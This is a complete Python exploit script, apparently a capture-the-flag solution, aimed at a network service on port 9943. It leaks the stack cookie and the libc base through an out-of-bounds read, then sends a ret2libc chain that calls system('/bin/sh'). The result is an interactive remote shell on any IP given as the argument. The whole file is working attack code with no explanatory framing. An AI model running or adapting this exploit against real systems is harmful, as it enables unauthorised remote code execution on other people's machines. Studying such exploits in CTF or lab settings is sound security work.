#!/usr/bin/python

import sys
import pexpect
import ctypes
import struct
import time

proc = None

cookie_index = 257
libc_return_address_index = 261

# Distance between return address within __libc_start_main and libc's base address
libc_start_main_return_to_base_address_distance = 0x19a83

# Offset of system() within libc binary
system_offset = 0x40190

# Offset of "/bin/sh" string within libc binary
libc_bin_sh_offset = 0x160a24

def readall():
    data = []
    while True:
        try:
            proc.expect('\n')
            c = proc.before
            if not c: break
            c = c.replace('\r', '\n')
            data.append(c)
        except (pexpect.TIMEOUT, pexpect.EOF) as e:
            data.append(proc.before)
            break
    return data

def interact(*params):
    out = []
    for param in params:
        proc.sendline(str(param))
        out.extend(readall())
        time.sleep(0.1)
    out.extend(readall())
    return out

def shell():
    # 0x03 is a Control-C escape code.
    proc.interact('\x03')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: exploit.py <IP>"
        sys.exit(1)

    prog = "nc %s 9943" % sys.argv[1]
    print "Connecting to %s..." % sys.argv[1]
    proc = pexpect.spawn(prog, timeout=0.1)

    print "Step 1: Leaking stack cookie and PIE module base address"

    out = interact(2, cookie_index)
    out = out[8]
    out = out[out.find('=')+2:-1]
    cookie = ctypes.c_uint32(int(out)).value

    out2 = interact(2, libc_return_address_index)
    out2 = out2[3]
    out2 = out2[out2.find('=')+2:-1]
    libc_base_address = ctypes.c_uint32(int(out2) 
            - libc_start_main_return_to_base_address_distance).value

    system_addr = libc_base_address + system_offset
    bin_sh_addr = libc_base_address + libc_bin_sh_offset

    print "\tLeaked cookie value: 0x%08x" % cookie
    print "\tLeaked libc base address: 0x%08x" % libc_base_address
    print "\t\tsystem() @ 0x%08x" % system_addr
    print "\t\t'/bin/sh' string @ 0x%08x" % bin_sh_addr

    print "Step 2: Building ROP chain to invoke /bin/sh"

    buf = []
    buf.extend([0x41414141] * 256)
    buf.append(cookie)
    buf.append(0x42424242)
    buf.append(0x43434343)
    buf.append(0x44444444)
    buf.append(system_addr)
    buf.append(0x45454545)
    buf.append(bin_sh_addr)

    print "Step 3: Adding %d elements in order to prepare ROP chain within process memory" % len(buf)

    buf_to_write = ""
    for b in range(len(buf)):
        buf_to_write += "1\n" + str(buf[b]) + "\n"

    assert len(buf_to_write) > 5*len(buf), "Constructed buf_to_write is too short"
    interact(buf_to_write.strip())

    print "\nStep 4: Fingers crossed, we're leaving binary - await the shell"
    interact(3)

    sys.stdout.write("$ ")
    shell()

